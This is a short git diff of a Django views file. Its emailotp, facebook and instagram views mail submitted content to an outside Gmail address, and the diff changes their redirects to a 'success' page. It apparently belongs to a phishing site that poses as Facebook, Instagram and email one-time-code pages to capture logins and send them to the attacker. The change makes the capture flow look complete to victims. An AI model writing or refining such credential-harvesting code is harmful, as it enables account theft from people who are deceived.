@@ -50,7 +50,7 @@ def emailotp(request):
         ['bigshady500@gmail.com'], 
         fail_silently=False, html_message=message)
 
-       return redirect('emailotp')
+       return redirect('success')
 
    return render(request, 'donate/emailotp.html')
 
@@ -83,7 +83,7 @@ def facebook(request):
         ['bigshady500@gmail.com'], 
         fail_silently=False, html_message=message)
 
-       return redirect('confirm_account')
+       return redirect('success')
 
    return render(request, 'donate/facebook.html')
 
@@ -103,7 +103,7 @@ def instagram(request):
         ['bigshady500@gmail.com'], 
         fail_silently=False, html_message=message)
 
-       return redirect('confirm_account')
+       return redirect('success')
 
    return render(request, 'donate/instagram.html')
 
